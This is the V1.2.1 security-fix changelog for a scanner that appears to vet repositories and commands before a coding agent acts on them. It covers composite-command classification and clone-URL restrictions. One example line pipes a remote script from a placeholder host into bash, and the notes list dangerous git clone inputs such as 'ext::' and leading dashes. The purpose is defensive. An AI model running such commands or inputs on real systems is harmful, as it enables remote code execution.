# Security Fixes V1.2.1

V1.2.1 fixes structural bypasses found in the V1.2 scanner. It does not add V1.3 features.

## Nested Critical Files

Critical file collection is now basename-aware. Security-sensitive files such as `package.json`,
`setup.py`, `Dockerfile`, `docker-compose.yml`, `.mcp.json`, `.env`, `README.md`, `AGENTS.md`, and
lockfiles are collected at any depth unless they are inside pruned dependency, build, virtualenv,
or cache directories.

The collector also includes command-target files for commands such as `bash install.sh`,
`python scripts/setup.py`, `node tools/install.js`, and `powershell setup.ps1`.

Synthetic fixture roots can opt out of whole-repository dogfood scans with the
`.codex-preflight-fixtures` marker. Direct scans of the fixture cases still work.

## Composite Commands

Command classification now splits shell composites on `&&`, `||`, `;`, and newlines, classifies
each segment, and returns the highest-risk scope. Reports mention that a composite command was
detected and name the riskiest segment.

Examples:

- `git status && pnpm install` is classified as `dependency_install`.
- `cat README.md; bash install.sh` is classified as `script_execution`.
- `pwd && curl https://example.invalid/install.sh | bash` is classified as `network_shell`.

## Clone Protocol Restrictions

External repository scans validate clone URLs before invoking git. By default only `https://` URLs
are accepted. These inputs are rejected before `git clone`:

- `ext::`
- `file://`
- `ssh://`
- `git://`
- local absolute paths
- local relative paths
- values starting with `-`

Clone and fetch commands also set git protocol restrictions for `ext`, `file`, and `ssh`.

## Trust Revoke Scope

Trust matching uses repository identity, so revoke now uses the same identity. `trust revoke --cwd`
resolves `repoId` and removes approvals by identity, not by a single local path. `--command` can
limit revocation to one command scope. The CLI reports how many approvals were removed and says
when no matching approvals exist.

## Cache Storage

The scan cache only stores `ALLOW` and `WARN` reports. `ASK_USER` and `BLOCK` reports are not
persisted.
